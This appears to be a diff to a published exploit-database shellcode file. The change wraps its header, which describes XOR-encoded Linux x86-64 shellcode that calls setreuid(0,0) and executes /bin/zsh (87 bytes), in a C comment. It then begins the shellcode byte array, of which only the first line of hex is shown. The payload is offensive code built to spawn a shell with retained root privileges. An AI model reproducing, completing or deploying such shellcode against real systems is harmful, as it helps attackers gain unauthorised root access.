@@ -1,8 +1,10 @@
+/*
 # Title: Linux x86-64 setreuid (0,0) & execve("/bin/zsh", ["/bin/zsh", NULL]) + XOR encoded - 87 bytes
 # Author: egeektronic <info (at) egeektronic {dot} com>
 # Twitter: @egeektronic
 # Tested on: Slackware 13.37
 # Thanks: Mark Loiseau, entropy [at] phiral.net and metasm developer
+*/
 
 unsigned char shellcode[] = 
 "\x4d\x31\xc0\x41\xb1\x3c\xeb\x1a\x58\x48\x31\xc9\x48\x31\xdb"
